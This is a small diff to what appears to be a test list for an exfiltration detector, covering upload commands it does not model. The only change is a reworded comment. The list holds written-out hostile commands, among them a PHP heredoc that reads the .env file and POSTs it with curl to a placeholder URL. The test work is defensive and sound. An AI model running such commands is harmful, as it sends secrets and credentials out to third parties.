@@ -1113,7 +1113,7 @@ _UPLOADS_NOT_MODELED = [
     # A runner's quoted payload, which the code reader does not read.
     f"ssh host 'python3 -c \"{_PY_UPLOAD_LINE}\"'",
     f"docker exec app sh -c 'python3 -c \"{_PY_UPLOAD_LINE}\"'",
-    # PHP reading its program from standard input, and a receiver the code never binds.
+    # PHP reading its program from standard input, and a receiver bound by a loop, which the reader does not follow.
     (
         f"php <<'PHP'\n<?php\n$c = curl_init(\"{_URL}\");\n"
         'curl_setopt($c, CURLOPT_POSTFIELDS, file_get_contents(".env"));\ncurl_exec($c);\nPHP'
